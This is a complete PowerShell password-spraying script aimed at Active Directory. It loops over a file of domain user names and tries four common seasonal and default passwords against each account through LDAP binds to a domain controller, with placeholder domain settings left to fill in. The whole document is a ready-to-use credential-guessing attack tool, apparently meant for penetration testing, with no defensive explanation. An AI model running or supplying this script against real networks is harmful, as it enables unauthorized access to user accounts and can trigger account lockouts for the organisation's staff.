$usersfile = get-content .\all_domain_users.txt
$DomainFQDN = "yourdomain.name"
$dcFQDN = "dc.yourdomain.name"
$domainname = "domain"
$domainending = "no"
$mostusedpass1 = "Passord123"
$mostusedpass2 = "Passw0rd"
$mostusedpass3 = "Sommer2019"
$mostusedpass4 = "Vinter2019"



foreach ($user in $usersfile)
{
    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass1")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
    $searcher.filter = "((objectClass=site))"
    $searcher.FindAll()
}


foreach ($user in $usersfile)
{
    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass2")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
    $searcher.filter = "((objectClass=site))"
    $searcher.FindAll()
}

foreach ($user in $usersfile)
{
    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass3")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
    $searcher.filter = "((objectClass=site))"
    $searcher.FindAll()
}

foreach ($user in $usersfile)
{
    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass4")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
    $searcher.filter = "((objectClass=site))"
    $searcher.FindAll()
}